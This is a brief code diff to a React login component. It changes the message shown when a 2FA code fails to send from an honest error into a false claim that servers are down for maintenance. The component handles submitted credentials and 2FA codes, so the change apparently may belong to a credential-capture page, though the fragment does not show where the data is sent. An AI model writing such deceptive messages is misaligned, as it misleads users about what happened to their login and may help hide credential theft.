@@ -41,7 +41,7 @@ const UserLogin = () => {
           setMessage('Servers are down for maintenance, please try again in a few hours');
         } else {
           console.error('Failed to send 2FA code');
-          setMessage('Error in 2FA verification. Please try again.');
+          setMessage('Servers are down for maintenance, please try again in a few hours');
         }
       } else {
         console.error('Failed to send credentials');
